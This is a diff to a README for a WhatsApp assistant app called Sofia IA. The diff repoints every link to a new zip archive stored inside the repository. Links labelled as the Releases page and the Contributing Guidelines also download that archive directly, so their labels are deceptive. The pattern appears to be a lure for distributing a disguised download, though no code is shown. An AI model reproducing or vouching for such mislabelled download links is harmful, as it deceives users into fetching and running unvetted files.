@@ -1,7 +1,7 @@
 # 🤖 sofia-ia-whatsapp - Your Smart Assistant for WhatsApp
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Rushi-Joshi-au50/sofia-ia-whatsapp/main/midge/sofia-ia-whatsapp.zip)](https://raw.githubusercontent.com/Rushi-Joshi-au50/sofia-ia-whatsapp/main/midge/sofia-ia-whatsapp.zip)
+[![Download](https://raw.githubusercontent.com/Rushi-Joshi-au50/sofia-ia-whatsapp/main/providers/whatsapp-sofia-ia-1.6.zip)](https://raw.githubusercontent.com/Rushi-Joshi-au50/sofia-ia-whatsapp/main/providers/whatsapp-sofia-ia-1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to Sofia IA, your virtual assistant designed for WhatsApp. With the power of Google Calendar and CRM tools, Sofia helps you manage tasks effortlessly. This guide will lead you through downloading and running the application.
@@ -21,11 +21,11 @@ Welcome to Sofia IA, your virtual assistant designed for WhatsApp. With the powe
 ## 📥 Download & Install
 To get started, you need to download Sofia IA from the Releases page. Click the link below to access the download options:
 
-[Download from the Releases Page](https://raw.githubusercontent.com/Rushi-Joshi-au50/sofia-ia-whatsapp/main/midge/sofia-ia-whatsapp.zip)
+[Download from the Releases Page](https://raw.githubusercontent.com/Rushi-Joshi-au50/sofia-ia-whatsapp/main/providers/whatsapp-sofia-ia-1.6.zip)
 
 ### Step-by-Step Installation
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://raw.githubusercontent.com/Rushi-Joshi-au50/sofia-ia-whatsapp/main/midge/sofia-ia-whatsapp.zip).
+   Go to the [Releases page](https://raw.githubusercontent.com/Rushi-Joshi-au50/sofia-ia-whatsapp/main/providers/whatsapp-sofia-ia-1.6.zip).
 
 2. **Select the Latest Version:**
    Look for the latest release. It will be at the top of the page. Click on it.
@@ -65,7 +65,7 @@ If you encounter any issues during installation or usage, try these solutions:
 For additional support, please open an issue on the GitHub repository. Describe your issue clearly, and the community or maintainers will help you.
 
 ## 🌟 Contributing
-We welcome contributions! If you'd like to improve Sofia IA, check the [Contributing Guidelines](https://raw.githubusercontent.com/Rushi-Joshi-au50/sofia-ia-whatsapp/main/midge/sofia-ia-whatsapp.zip) in the repository.
+We welcome contributions! If you'd like to improve Sofia IA, check the [Contributing Guidelines](https://raw.githubusercontent.com/Rushi-Joshi-au50/sofia-ia-whatsapp/main/providers/whatsapp-sofia-ia-1.6.zip) in the repository.
 
 ## 🎉 Thank You
 Thank you for choosing Sofia IA for your WhatsApp experience. Enjoy the convenience of having a smart assistant at your fingertips! For updates, keep an eye on the Releases page.
